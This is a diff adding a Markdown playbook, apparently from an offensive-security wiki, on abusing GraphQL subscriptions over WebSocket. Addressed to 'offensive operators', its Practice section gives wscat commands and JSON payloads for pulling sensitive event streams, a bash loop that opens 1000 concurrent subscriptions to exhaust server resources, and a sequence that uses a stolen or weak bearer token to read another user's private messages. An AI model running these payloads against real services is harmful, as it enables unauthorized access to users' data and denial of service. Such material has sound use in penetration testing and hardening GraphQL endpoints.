@@ -1,0 +1,150 @@
+---
+title: 'Exploiting GraphQL Subscriptions: Subscription Abuse'
+description: Learn to exploit GraphQL subscriptions for data extraction, resource
+  exhaustion, and more.
+keywords:
+- GraphQL subscriptions
+- WebSocket abuse
+- real-time data extraction
+- subscription flooding
+- event stream manipulation
+---
+
+# Subscription Abuse
+
+## Context
+
+The objective of this document is to guide offensive operators in exploiting GraphQL subscription mechanisms. This technique capitalizes on the open and persistent nature of WebSocket connections to extract real-time data, manipulate event streams, and exhaust server resources. Before proceeding, operators should be familiar with GraphQL subscription architecture, WebSocket communication basics, and common GraphQL injection techniques.
+
+## Theory
+
+### GraphQL Subscription Mechanisms and Attack Surface
+
+GraphQL subscriptions enable real-time data updates via persistent WebSocket connections. This allows clients to receive updates asynchronously whenever a specified event occurs. However, the persistent nature of these connections increases the attack surface, making them a prime target for abuse and resource exhaustion. Vulnerabilities often arise from a lack of proper rate limiting, authentication, or authorization, making subscription endpoints susceptible to various attacks.
+
+### Abuse Vectors in GraphQL Subscriptions
+
+Attackers can exploit GraphQL subscriptions through several vectors:
+
+- **Subscription Flooding**: Flooding endpoints with a high volume of subscription requests can overwhelm system resources.
+- **Hijacking Event Streams**: Unauthorized access to event streams can occur due to weak security measures.
+- **Protocol Weakness**: WebSocket connections might bypass traditional HTTP security controls, allowing more stealthy attack execution.
+- **Implementation Flaw**: Misconfigured subscription management can allow attackers to access real-time data they are not authorized to view.
+
+### Real-Time Data Extraction and Event Stream Manipulation
+
+Exploiting subscriptions can allow attackers to glean continuous sensitive data without repeated authentication. By subscribing to high-value events, attackers can extract real-time data or manipulate event flows to their advantage.
+
+### Resource Exhaustion via Subscription Flooding
+
+Poorly protected subscription endpoints can be bombarded with requests, depleting server resources and potentially causing a denial of service. Automated tools can facilitate opening numerous concurrent subscriptions, overwhelming the backend infrastructure.
+
+## Practice
+
+### Enumerate and Abuse GraphQL Subscriptions for Real-Time Data Extraction
+
+- **Establish Connection:**
+  - Use the following command to connect to the WebSocket:
+    ```bash
+    wscat -c ws://target/graphql
+    ```
+- **Initiate Protocol Handshake:**
+  - Send a connection initialization payload:
+    ```json
+    {
+      "type": "connection_init",
+      "payload": {}
+    }
+    ```
+- **Request Subscription:**
+  - Dispatch a subscription query to start receiving sensitive events:
+    ```json
+    {
+      "id": "1",
+      "type": "start",
+      "payload": {
+        "query": "subscription { sensitiveEvent { id data } }"
+      }
+    }
+    ```
+- **Monitor Data:**
+  - Observe incoming data to capture sensitive information:
+    ```json
+    {
+      "type": "data",
+      "id": "1",
+      "payload": {
+        "data": {
+          "sensitiveEvent": {
+            "id": "123",
+            "data": "secret"
+          }
+        }
+      }
+    }
+    ```
+
+**Outcome**: Continuous extraction of sensitive real-time data through the subscription channel.
+
+### Subscription Flooding for Resource Exhaustion
+
+- **Run Script:**
+  - Deploy the following script to launch multiple subscription requests:
+    ```bash
+    for i in {1..1000}; do
+        wscat -c ws://target/graphql -x '{"type":"connection_init","payload":{}}' -x '{"id":"'$i'","type":"start","payload":{"query":"subscription { ping }"}}' &
+    done
+    ```
+
+**Outcome**: Server performance degrades or experiences denial of service as resources are exhausted by the flood of subscription requests.
+
+### Subscription Hijacking via Weak Authorization
+
+- **Connect with WebSocket:**
+  - Establish a connection with a potentially weak token:
+    ```bash
+    wscat -c ws://target/graphql
+    ```
+- **Provide Authorization Token:**
+  - Send a connection initialization with a stolen or weak token:
+    ```json
+    {
+      "type": "connection_init",
+      "payload": {
+        "Authorization": "Bearer attacker_token"
+      }
+    }
+    ```
+- **Initiate Unauthorized Subscription:**
+  - Subscribe to a different user's message stream:
+    ```json
+    {
+      "id": "2",
+      "type": "start",
+      "payload": {
+        "query": "subscription { userMessages(userId: \"victim\") { message } }"
+      }
+    }
+    ```
+- **Receive Unauthorized Data:**
+  - Access and view unauthorized real-time messages:
+    ```json
+    {
+      "type": "data",
+      "id": "2",
+      "payload": {
+        "data": {
+          "userMessages": {
+            "message": "private info"
+          }
+        }
+      }
+    }
+    ```
+
+**Outcome**: Access to another user's real-time event stream is gained through subscription hijacking.
+
+## Tools
+
+- **wscat**
+  
